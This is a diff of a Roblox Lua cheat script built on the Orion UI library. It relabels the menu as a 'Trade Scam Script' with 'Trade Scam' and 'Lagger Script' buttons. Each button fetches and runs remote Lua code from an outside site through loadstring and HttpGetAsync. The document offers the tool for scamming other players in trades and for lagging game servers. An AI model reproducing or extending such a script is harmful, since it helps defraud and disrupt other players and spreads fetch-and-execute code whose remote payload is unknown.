@@ -1,6 +1,6 @@
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 
-local Window = OrionLib:MakeWindow({Name = "Wumat Visual Script", HidePremium = false, SaveConfig = true, ConfigFolder = "SpartanPlutonFolder"})
+local Window = OrionLib:MakeWindow({Name = "Trade Scam Script", HidePremium = false, SaveConfig = true, ConfigFolder = "SpartanPlutonFolder"})
 OrionLib:MakeNotification({
     Name = "Wumat Visual Hub",
     Content = "Launching Success!",
@@ -21,34 +21,34 @@ local Section = Tab:AddSection({
 }) 
 
 local Tab = Window:MakeTab({
-    Name = "PetChangerID",
+    Name = "Trade Scam",
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
 })
 
 local Section = Tab:AddSection({
-    Name = "PetChangerID V1"
+    Name = "Trade Scam FIXED"
 })
 
 Tab:AddButton({
     Name = "ON",
     Callback = function()
               print("Click here!")
-      loadstring(game:HttpGet('https://pastebin.com/raw/4Lg12SD8'))()
+      loadstring(game:HttpGetAsync("https://bloxscripts.fun/scripts/1fd2afc849.lua", true))()
         end    
 
 })
 
 
 local Section = Tab:AddSection({
-    Name = "PetChangerID V2"
+    Name = "Lagger Script"
 })
 
 Tab:AddButton({
     Name = "ON",
     Callback = function()
               print("Click here!")
-      loadstring(game:HttpGet('https://pastebin.com/raw/4Lg12SD8'))()
+      loadstring(game:HttpGetAsync("https://bloxscripts.fun/scripts/1fd2afc849.lua", true))()
         end    
 })
 
@@ -59,7 +59,7 @@ local Tab = Window:MakeTab({
 })
 
 local Section = Tab:AddSection({
-    Name = "Trade Scam"
+    Name = "COMING SOON"
 })
 
 Tab:AddButton({
